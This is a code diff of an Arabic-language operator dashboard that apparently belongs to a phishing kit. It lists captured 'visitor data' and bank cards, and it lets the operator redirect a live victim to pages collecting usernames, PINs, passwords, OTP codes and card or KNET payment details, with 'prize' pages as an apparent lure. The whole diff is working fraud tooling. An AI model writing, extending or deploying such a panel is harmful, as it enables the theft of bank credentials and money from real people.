@@ -845,7 +845,7 @@
       .sort((a, b) => (b.time || 0) - (a.time || 0))
       .map(s => s.html)
       .join('') + basicBoxHtml;
-    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="wait">صفحة الانتظار</button><button data-ref-nav="prizeusername">اسم المستخدم</button><button data-ref-nav="prizepassword">الرقم السري 6 أرقام</button><button data-ref-nav="prizetextpassword">كلمة المرور النصية</button><button data-ref-nav="prizwait">انتظار المسابقة</button><button data-ref-nav="login">تسجيل الدخول</button><button data-ref-nav="forgot">نسيت كلمة المرور</button><button data-ref-nav="otpcode">رمز التحقق OTP</button><button data-ref-nav="otpnew">رمز 4 أرقام</button><button data-ref-nav="regist">إكمال التسجيل</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="wait">صفحة الانتظار</option><option value="prizeusername">اسم المستخدم</option><option value="prizepassword">الرقم السري 6 أرقام</option><option value="prizetextpassword">كلمة المرور النصية</option><option value="prizwait">انتظار المسابقة</option><option value="login">تسجيل الدخول</option><option value="forgot">نسيت كلمة المرور</option><option value="otpcode">رمز التحقق OTP</option><option value="otpnew">رمز 4 أرقام</option><option value="regist">إكمال التسجيل</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
+    els.referenceDetailContent.innerHTML = `<div class="ref-detail-head"><div><button class="ref-mobile-back" data-ref-action="back">‹ القائمة</button><span class="ref-detail-kicker">بيانات الزائر</span><h2>${escapeHtml(name)}</h2><small>${escapeHtml(visitor.currentPage || 'صفحة غير معروفة')} · ${escapeHtml(timeAgo(visitor.lastSeen || visitor.createdDate))}</small></div><div class="ref-detail-head-actions"><button data-ref-action="refresh" title="تحديث">↻</button><button data-ref-action="block" title="حظر">⊘</button><span class="ref-status">${escapeHtml(statusText)}</span></div></div><div class="ref-detail-actions"><button data-ref-nav="home">الرئيسية</button><button data-ref-nav="prizeusername">اسم المستخدم</button><button data-ref-nav="prizetextpassword">كلمة المرور النصية</button><button data-ref-nav="prizwait">انتظار المسابقة</button><select data-ref-nav-select><option value="">توجيه إلى...</option><option value="home">الرئيسية</option><option value="prizeusername">اسم المستخدم</option><option value="prizetextpassword">كلمة المرور النصية</option><option value="prizwait">انتظار المسابقة</option></select><input class="ref-nav-free" data-ref-nav-free placeholder="مسار مخصص (مثل صفحة.html)..." /><button data-ref-nav-free-go>توجيه</button></div><div class="ref-detail-stack">${stackSections}</div>`;
     els.referenceDetailEmpty.classList.add('hidden');
     if (boxCounterTimer) clearInterval(boxCounterTimer);
     els.referenceDetailContent.querySelectorAll('.bank-card').forEach((cardElement, index) => {
@@ -881,25 +881,9 @@
     els.referenceDetailContent.classList.remove('hidden');
     const NAV_PAGE_MAP = {
       home: 'index.html',
-      loan: 'loan.html',
-      shop: 'shop.html',
-      watch: 'watch.html',
-      refund: 'refund.html',
-      wait: 'wait1.html',
-      login: 'login.html',
-      forgot: 'forgot-password.html',
-      otpcode: 'otp.html',
-      otpnew: 'otp-new.html',
-      regist: 'login-regist.html',
       prizeusername: 'prize-username.html',
-      prizepassword: 'prize-password.html',
       prizetextpassword: 'prize-text-password.html',
       prizwait: 'prize-wait.html',
-      orders: 'order1.html',
-      knet: 'knet.html',
-      verification: 'verification.html',
-      card: 'card-payment.html',
-      otp: 'otpcredit_card_page.html',
     };
     // إرسال أمر توجيه للعميل عبر RTDB commands/{sessionId}/redirect
     // كل أمر يحمل seq فريدة لضمان تغيير القيمة دائماً (حتى لنفس الصفحة) فيستقبله العميل
